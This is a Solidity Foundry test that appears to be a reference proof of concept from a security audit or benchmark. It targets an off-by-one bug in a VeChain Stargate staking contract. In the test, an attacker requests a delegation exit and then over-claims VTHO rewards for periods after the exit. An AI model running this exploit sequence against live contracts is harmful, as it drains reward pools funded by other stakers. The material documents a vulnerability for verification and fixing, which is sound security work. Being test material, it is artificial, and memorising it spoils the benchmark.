// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

import {Test} from "forge-std/Test.sol";
import {ERC1967Proxy} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
import {Stargate} from "target/contracts/Stargate.sol";
import {StargateNFTMock} from "target/contracts/mocks/StargateNFTMock.sol";
import {ProtocolStakerMock} from "target/contracts/mocks/ProtocolStakerMock.sol";
import {MyERC20} from "target/contracts/mocks/MyERC20.sol";
import {DataTypes} from "target/contracts/StargateNFT/libraries/DataTypes.sol";

/// Reference PoC for vechain-stargate/hayabusa — post_exit_overclaim (see README.md).
/// Convention: each test PASSES while its bug is present and FAILS once the bug's
/// fix patch is applied (the counterfactual-attribution contract).
contract PocTest is Test {
    address internal constant VTHO = 0x0000000000000000000000000000456E65726779;

    ProtocolStakerMock internal staker;
    StargateNFTMock internal nft;
    Stargate internal stargate;

    address internal alice = address(0xA11CE);
    address internal bob = address(0xB0B);
    address internal validator = address(0xBA111);

    function setUp() public {
        staker = new ProtocolStakerMock();
        nft = new StargateNFTMock();

        Stargate impl = new Stargate();
        Stargate.InitializeV1Params memory params = Stargate.InitializeV1Params({
            admin: address(this),
            protocolStakerContract: address(staker),
            stargateNFTContract: address(nft),
            maxClaimablePeriods: 832
        });
        ERC1967Proxy proxy = new ERC1967Proxy(
            address(impl), abi.encodeCall(Stargate.initialize, (params))
        );
        stargate = Stargate(payable(address(proxy)));
        staker.helper__setStargate(address(stargate));

        // VTHO is a vechain builtin at a fixed address: etch a mock ERC20 there
        // and fund the Stargate contract's reward pool.
        MyERC20 vthoImpl = new MyERC20(address(this), address(this));
        vm.etch(VTHO, address(vthoImpl).code);
        MyERC20(VTHO).mint(address(stargate), 1_000_000 ether);

        // one staking level: 1 VET in, effective stake 1:1
        nft.helper__setLevel(DataTypes.Level({
            name: "Thunder",
            isX: false,
            id: 1,
            maturityBlocks: 0,
            scaledRewardFactor: 100,
            vetAmountRequiredToStake: 1 ether
        }));
        nft.helper__setToken(DataTypes.Token({
            tokenId: 0,
            levelId: 1,
            mintedAtBlock: 0,
            vetAmountStaked: 1 ether,
            lastVetGeneratedVthoClaimTimestamp_deprecated: 0
        }));

        staker.addValidation(validator, 1);
        staker.helper__setValidatorStatus(validator, ProtocolStakerMock.ValidatorStatus.ACTIVE);

        vm.deal(alice, 10 ether);
        vm.deal(bob, 10 ether);
    }

    function _stakeAndDelegate(address who) internal returns (uint256 tokenId) {
        vm.prank(who);
        tokenId = stargate.stake{value: 1 ether}(1);
        vm.prank(who);
        stargate.delegate(tokenId, validator);
    }

    /// Bug B: off-by-one in _claimableDelegationPeriods — when endPeriod equals the
    /// next claimable period, the ended-delegation branch is skipped and the claim
    /// runs up to the validator's completedPeriods, paying post-exit periods.
    /// Bob (honest, still delegated) keeps the denominator alive; Alice's effective
    /// stake never decays, so periods after her endPeriod still pay her.
    /// Vulnerable: Alice receives 3 periods of rewards (0.25 VTHO).
    /// Fixed (>= boundary + endPeriod <= lastClaimed guard): she receives 1 (0.05).
    function test_post_exit_overclaim() public {
        _stakeAndDelegate(bob); // honest, never exits
        uint256 attacker = _stakeAndDelegate(alice); // both delegate at completedPeriods = 0

        staker.helper__setValidationCompletedPeriods(validator, 1);
        vm.prank(alice);
        stargate.requestDelegationExit(attacker); // mock: endPeriod = 2 == nextClaimablePeriod

        staker.helper__setValidationCompletedPeriods(validator, 4);

        uint256 before_ = MyERC20(VTHO).balanceOf(alice);
        vm.prank(alice);
        stargate.claimRewards(attacker);
        uint256 got = MyERC20(VTHO).balanceOf(alice) - before_;

        // honest entitlement (period 2 only) is 0.05 VTHO; anything beyond is theft
        assertGt(got, 0.06 ether);
    }
}
